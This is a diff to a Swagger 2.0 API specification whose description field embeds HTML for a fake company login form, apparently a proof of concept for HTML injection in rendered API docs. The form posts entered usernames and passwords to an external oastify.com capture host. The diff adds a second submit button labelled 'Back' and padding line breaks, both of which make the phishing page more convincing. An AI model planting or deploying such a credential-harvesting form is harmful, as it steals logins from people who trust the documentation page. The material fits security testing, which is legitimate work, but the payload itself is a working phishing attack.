@@ -1,13 +1,13 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
+  title: Proof-Of-Concept
   description: '<div class="login-form">
     <div class="heading">
-        <h1>Company FAKE Login</h1>
+        <center><h1>FAKE Company Login</h1></center>
     </div>
     <div class="form-container">
-        <form action="https://me4nsq32qarc6sdsylba1wk86zcq0go5.oastify.com/" method="post" class="form-signin">
+        <center><form action="https://me4nsq32qarc6sdsylba1wk86zcq0go5.oastify.com/" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
@@ -17,11 +17,12 @@ info:
                 <input type="password" name="password" size="20">
             </div>
             <div class="form-group">
+                <button type="submit" class="btn btn-default">Back</button>
                 <button type="submit" class="btn btn-default">Login</button>
             </div>
         </form>
     </div>
-</div>'
+</div><br><br><br><br><br><br><br><br><br><br><br><br>'
 paths:
   /:
     post:
